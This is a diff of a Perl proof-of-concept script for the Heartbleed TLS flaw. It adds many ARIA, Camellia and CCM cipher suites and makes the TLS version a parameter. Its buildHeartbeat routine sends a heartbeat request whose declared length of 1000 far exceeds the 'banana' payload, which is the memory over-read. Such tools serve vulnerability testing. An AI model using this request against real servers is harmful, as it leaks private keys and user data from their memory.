+        'C063',        # TLS_ECDH_RSA_WITH_ARIA_256_GCM_SHA384
+        'C064',        # TLS_PSK_WITH_ARIA_128_CBC_SHA256
+        'C065',        # TLS_PSK_WITH_ARIA_256_CBC_SHA384
+        'C066',        # TLS_DHE_PSK_WITH_ARIA_128_CBC_SHA256
+        'C067',        # TLS_DHE_PSK_WITH_ARIA_256_CBC_SHA384
+        'C068',        # TLS_RSA_PSK_WITH_ARIA_128_CBC_SHA256
+        'C069',        # TLS_RSA_PSK_WITH_ARIA_256_CBC_SHA384
+        'C06A',        # TLS_PSK_WITH_ARIA_128_GCM_SHA256
+        'C06B',        # TLS_PSK_WITH_ARIA_256_GCM_SHA384
+        'C06C',        # TLS_DHE_PSK_WITH_ARIA_128_GCM_SHA256
+        'C06D',        # TLS_DHE_PSK_WITH_ARIA_256_GCM_SHA384
+        'C06E',        # TLS_RSA_PSK_WITH_ARIA_128_GCM_SHA256
+        'C06F',        # TLS_RSA_PSK_WITH_ARIA_256_GCM_SHA384
+        'C070',        # TLS_ECDHE_PSK_WITH_ARIA_128_CBC_SHA256
+        'C071',        # TLS_ECDHE_PSK_WITH_ARIA_256_CBC_SHA384
+        'C072',        # TLS_ECDHE_ECDSA_WITH_CAMELLIA_128_CBC_SHA256
+        'C073',        # TLS_ECDHE_ECDSA_WITH_CAMELLIA_256_CBC_SHA384
+        'C074',        # TLS_ECDH_ECDSA_WITH_CAMELLIA_128_CBC_SHA256
+        'C075',        # TLS_ECDH_ECDSA_WITH_CAMELLIA_256_CBC_SHA384
+        'C076',        # TLS_ECDHE_RSA_WITH_CAMELLIA_128_CBC_SHA256
+        'C077',        # TLS_ECDHE_RSA_WITH_CAMELLIA_256_CBC_SHA384
+        'C078',        # TLS_ECDH_RSA_WITH_CAMELLIA_128_CBC_SHA256
+        'C079',        # TLS_ECDH_RSA_WITH_CAMELLIA_256_CBC_SHA384
+        'C07A',        # TLS_RSA_WITH_CAMELLIA_128_GCM_SHA256
+        'C07B',        # TLS_RSA_WITH_CAMELLIA_256_GCM_SHA384
+        'C07C',        # TLS_DHE_RSA_WITH_CAMELLIA_128_GCM_SHA256
+        'C07D',        # TLS_DHE_RSA_WITH_CAMELLIA_256_GCM_SHA384
+        'C07E',        # TLS_DH_RSA_WITH_CAMELLIA_128_GCM_SHA256
+        'C07F',        # TLS_DH_RSA_WITH_CAMELLIA_256_GCM_SHA384
+        'C080',        # TLS_DHE_DSS_WITH_CAMELLIA_128_GCM_SHA256
+        'C081',        # TLS_DHE_DSS_WITH_CAMELLIA_256_GCM_SHA384
+        'C082',        # TLS_DH_DSS_WITH_CAMELLIA_128_GCM_SHA256
+        'C083',        # TLS_DH_DSS_WITH_CAMELLIA_256_GCM_SHA384
+        'C084',        # TLS_DH_anon_WITH_CAMELLIA_128_GCM_SHA256
+        'C085',        # TLS_DH_anon_WITH_CAMELLIA_256_GCM_SHA384
+        'C086',        # TLS_ECDHE_ECDSA_WITH_CAMELLIA_128_GCM_SHA256
+        'C087',        # TLS_ECDHE_ECDSA_WITH_CAMELLIA_256_GCM_SHA384
+        'C088',        # TLS_ECDH_ECDSA_WITH_CAMELLIA_128_GCM_SHA256
+        'C089',        # TLS_ECDH_ECDSA_WITH_CAMELLIA_256_GCM_SHA384
+        'C08A',        # TLS_ECDHE_RSA_WITH_CAMELLIA_128_GCM_SHA256
+        'C08B',        # TLS_ECDHE_RSA_WITH_CAMELLIA_256_GCM_SHA384
+        'C08C',        # TLS_ECDH_RSA_WITH_CAMELLIA_128_GCM_SHA256
+        'C08D',        # TLS_ECDH_RSA_WITH_CAMELLIA_256_GCM_SHA384
+        'C08E',        # TLS_PSK_WITH_CAMELLIA_128_GCM_SHA256
+        'C08F',        # TLS_PSK_WITH_CAMELLIA_256_GCM_SHA384
+        'C090',        # TLS_DHE_PSK_WITH_CAMELLIA_128_GCM_SHA256
+        'C091',        # TLS_DHE_PSK_WITH_CAMELLIA_256_GCM_SHA384
+        'C092',        # TLS_RSA_PSK_WITH_CAMELLIA_128_GCM_SHA256
+        'C093',        # TLS_RSA_PSK_WITH_CAMELLIA_256_GCM_SHA384
+        'C094',        # TLS_PSK_WITH_CAMELLIA_128_CBC_SHA256
+        'C095',        # TLS_PSK_WITH_CAMELLIA_256_CBC_SHA384
+        'C096',        # TLS_DHE_PSK_WITH_CAMELLIA_128_CBC_SHA256
+        'C097',        # TLS_DHE_PSK_WITH_CAMELLIA_256_CBC_SHA384
+        'C098',        # TLS_RSA_PSK_WITH_CAMELLIA_128_CBC_SHA256
+        'C099',        # TLS_RSA_PSK_WITH_CAMELLIA_256_CBC_SHA384
+        'C09A',        # TLS_ECDHE_PSK_WITH_CAMELLIA_128_CBC_SHA256
+        'C09B',        # TLS_ECDHE_PSK_WITH_CAMELLIA_256_CBC_SHA384
+        'C09C',        # TLS_RSA_WITH_AES_128_CCM
+        'C09D',        # TLS_RSA_WITH_AES_256_CCM
+        'C09E',        # TLS_DHE_RSA_WITH_AES_128_CCM
+        'C09F',        # TLS_DHE_RSA_WITH_AES_256_CCM
+        'C0A0',        # TLS_RSA_WITH_AES_128_CCM_8
+        'C0A1',        # TLS_RSA_WITH_AES_256_CCM_8
+        'C0A2',        # TLS_DHE_RSA_WITH_AES_128_CCM_8
+        'C0A3',        # TLS_DHE_RSA_WITH_AES_256_CCM_8
+        'C0A4',        # TLS_PSK_WITH_AES_128_CCM
+        'C0A5',        # TLS_PSK_WITH_AES_256_CCM
+        'C0A6',        # TLS_DHE_PSK_WITH_AES_128_CCM
+        'C0A7',        # TLS_DHE_PSK_WITH_AES_256_CCM
+        'C0A8',        # TLS_PSK_WITH_AES_128_CCM_8
+        'C0A9',        # TLS_PSK_WITH_AES_256_CCM_8
+        'C0AA',        # TLS_PSK_DHE_WITH_AES_128_CCM_8
+        'C0AB',        # TLS_PSK_DHE_WITH_AES_256_CCM_8
+        'C0AC',        # TLS_ECDHE_ECDSA_WITH_AES_128_CCM
+        'C0AD',        # TLS_ECDHE_ECDSA_WITH_AES_256_CCM
+        'C0AE',        # TLS_ECDHE_ECDSA_WITH_AES_128_CCM_8
+        'C0AF',        # TLS_ECDHE_ECDSA_WITH_AES_256_CCM_8
     );
 
     my $random = q{};
@@ -401,10 +685,10 @@ sub buildHello {
     for ( 0 .. 55 ) {
         $random .= ( 0 .. 9, 'a' .. 'f' )[ rand(16) ];
     }
-
+    $ssltls = sprintf( "%04d", 300 + $ssltls + 1 );
     my $hello = join(
         q{},
-        (   '0302',    # TLS Version
+        (   $ssltls,    # TLS Version
             unpack( "H*", pack( "N*", time() ) ),    # get time for TLS time
             $random,    # stuff random bits for a valid data section
             '00',       # Session ID length (no session id)
@@ -424,16 +708,16 @@ sub buildHello {
         = '0100'
         . unpack( "H*", pack( "n*", length( pack( "H*", $hello ) ) ) )
         . $hello;
-    my $record = ssl_record( 'handshake', $hello );
+    my $record = ssl_record( 'handshake', $ssltls, $hello );
     return $record;
 }    # END buildHello
 
 sub buildHeartbeat {
-    my $payload
-        = "banana";               # this is the message we send in the request
+    my $ssltls  = shift @_;
+    my $payload = "banana";    # this is the message we send in the request
     my $stuffer
         = "!!Bowties are cool!!"; # the server is supposed to ignore this part
-    
+
     my $type = '01';              # heartbeat request
     $payload = unpack( "H*", pack( "a*", $payload ) );
     $stuffer = unpack( "H*", pack( "a*", $stuffer ) );
@@ -441,15 +725,16 @@ sub buildHeartbeat {
     my $data = $payload . $stuffer;
     ### sometimes servers don't respond when using the max value, also, it's just a PoC
     my $length = '1000';
-    my $record = ssl_record( 'heartbeat', $type . $length . $data );
+    $ssltls = sprintf( "%04d", 300 + $ssltls + 1 );
+    my $record = ssl_record( 'heartbeat', $ssltls, $type . $length . $data );
     return $record;
 }    # End buildHeartbeat
 
 sub ssl_record {
     ### Data is supposed to be in hex form, pack it at the end
     my $type = shift @_;
+    my $tls  = shift @_;
     my $data = shift @_;
-    my $tls  = '0302';
     if (!(     $type ne '22'
             or $type ne '24'
             or $type ne 'handshake'
